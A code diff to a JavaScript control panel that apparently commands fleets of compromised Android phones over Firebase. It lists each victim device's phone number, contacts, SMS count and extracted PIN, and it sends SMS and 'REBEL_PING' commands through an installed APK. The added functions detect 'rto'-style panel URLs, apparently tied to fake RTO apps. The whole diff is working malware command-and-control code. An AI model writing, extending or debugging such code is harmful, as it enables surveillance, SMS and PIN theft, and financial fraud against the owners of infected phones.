@@ -556,6 +556,22 @@ function buildDynamicSmsPaths(d,inst){
   });
   return uniqPaths(paths);
 }
+function isRtoStyleUrl(url){
+  return /rto9|rto0|rto91/i.test(url||'');
+}
+function isCommandOnlyRecord(s){
+  if(!s||typeof s!=='object')return false;
+  if(s.d_name||s.phone_number||s.modelName||s.Device_info||s.battery!==undefined)return false;
+  return !!(s.cmd||s.targetDeviceId||(s.command&&s.messageText)||(s.webhookEvent&&s.sendSms));
+}
+function getDeviceDisplayPhone(s){
+  if(!s)return'No Number';
+  if(s._phoneSource&&(s._phoneSource==='user_list'||s._phoneSource==='user_data')&&s.mobNo){
+    return parseDevicePhone(s.mobNo)||'No Number';
+  }
+  var p=parseDevicePhone(s.mobNo)||getPhoneFromRecord(s);
+  return p||'No Number';
+}
 function isRabelPanel(inst){
   if(!inst)return false;
   var url=(inst.restUrl||'');
@@ -658,6 +674,7 @@ function hasExplicitOnlineFlag(s){if(!s)return false;return s.online_status===tr
 function hasExplicitOfflineFlag(s){if(!s)return false;return s.online_status===false||s.status===false||s.status==='offline';}
 function resolveOnlineStatus(s,fbId){
   if(!s)return false;
+  if(isCommandOnlyRecord(s))return false;
   var now=Date.now();
   var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
   var hb=extractHeartbeatMs(s);var hbAge=hb?now-hb:Infinity;
@@ -1380,7 +1397,7 @@ function processClientsDataNow(){
     var smsIdx=inst&&inst.smsIndex&&inst.smsIndex[p.devId];
     var hasSms=!!(smsIdx&&smsIdx.roots&&smsIdx.roots.length);
     allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'user_list',
-      name:s.name||'Unknown',displayPhone:parseDevicePhone(s.mobNo)||getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
+      name:s.name||'Unknown',displayPhone:getDeviceDisplayPhone(s),brand:s.brand||'',android:s.android||'',
       status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,hasSms:hasSms,
       sims:extractDeviceSims(s),pin:extractPinFromRecord(s),hasPin:!!extractPinFromRecord(s),
       contacts:contacts,contactCount:contacts.length});
@@ -2049,12 +2066,12 @@ function sendSms(){
   document.getElementById('sendStatus').textContent='Sending via SIM '+_sendSimSlot+'...';
   sendSmsInternal(to,msg,_sendSimSlot,function(ok,data){
     if(ok){
-      document.getElementById('sendStatus').textContent='✅ Sent from SIM '+_sendSimSlot;
+      document.getElementById('sendStatus').textContent='✅ '+(data&&data.message||'SMS command sent');
       document.getElementById('sendMsg').value='';
-      toast('SMS sent to device',true);
+      toast((data&&data.message)||'SMS command sent — device APK must be online',true);
     }else{
       document.getElementById('sendStatus').textContent='❌ '+(data&&data.error||'Failed');
-      toast(data&&data.error||'Send failed',false);
+      toast(data&&data.error||'Send failed — check device is online on APK',false);
     }
   });
 }
@@ -2062,7 +2079,18 @@ function sendSms(){
 // ---- FIX: Check Recharge (Ping) ----
 function checkRecharge(){
   var d=getSelDev();if(!d){toast('Select a device first',false);return;}
-  var phone=d.displayPhone;
+  var raw=clientsRawMap[d.id];
+  var inst=getFbInstance(d.fbId);
+  if(inst&&isRtoStyleUrl(inst.restUrl)){
+    document.getElementById('sendStatus').textContent='Pinging device via Firebase command...';
+    sendSmsInternal('9999999999', 'REBEL_PING', _sendSimSlot, function(success, data){
+      document.getElementById('sendStatus').textContent=success?'✅ Ping command queued on device':'❌ '+(data&&data.error||'Ping failed');
+      if(success) toast('Ping command sent — device APK must be online to execute',true);
+      else toast(data&&data.error||'Ping failed',false);
+    });
+    return;
+  }
+  var phone=getDeviceDisplayPhone(raw);
   if(!phone||phone==='No Number'){toast('Device has no phone number',false);return;}
   document.getElementById('sendStatus').textContent='Pinging...';
   sendSmsInternal(phone, 'REBEL_PING', _sendSimSlot, function(success, data){
